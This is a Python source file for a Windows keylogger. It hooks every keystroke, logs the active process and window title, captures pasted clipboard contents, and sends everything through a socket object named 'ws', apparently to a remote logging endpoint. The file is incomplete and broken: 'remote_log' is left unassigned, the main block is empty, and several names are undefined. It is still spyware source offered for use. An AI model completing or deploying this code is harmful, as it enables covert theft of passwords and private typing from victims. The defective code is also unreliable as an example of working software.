#!/usr/bin/python
#! -*- coding: utf-8 -*-

def main():
    from base64 import b64encode
    from ctypes import windll, byref, create_string_buffer, c_ulong
    from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
    from pyHook import HookManager
    from pythoncom import PumpMessages

    def process():
        handle  = windll.user32.GetForegroundWindow()
        pid     = c_ulong(0)

        windll.user32.GetWindowThreadProcessId(handle, byref(pid))
        process_id = "%d" % pid.value
        executable = create_string_buffer("\x00" * 512)

        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)

        windll.psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        window_title = create_string_buffer("\x00" * 512)

        length = windll.user32.GetWindowTextA(handle, byref(window_title),512)
        output = "\n[ PID: %s - %s - %s ]\n" % (process_id, executable.value, window_title.value)
        windll.kernel32.CloseHandle(handle)
        windll.kernel32.CloseHandle(h_process)
        return output

    def onEvent(event):
        if event.WindowName != current_window:
            current_window = event.WindowName
            pid = process()
            ws.send("\n{}\n".format(pid))
            
        if event.Ascii > 32 and event.Ascii < 127:
            ws.send(chr(event.Ascii))
        elif event.Ascii == 32:
            ws.send(' ')
        elif event.Ascii in (10,13):
            ws.send('\n')
        elif event.Ascii == 0:
            pass
        else:
            if event.Key == "V" and os.name == 'nt':
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                ws.send("[PASTE] - %s" % (pasted_value))
            else:
                ws.send(str("%s" % event.Key))
        return True

    current_window  = None
    temp_buffer     = str()
    remote_log      =
    while True:
        kl = HookManager()
        kl.KeyDown = onEvent
        kl.HookKeyboard() 
        PumpMessages()



if __name__ == '__main__':
    
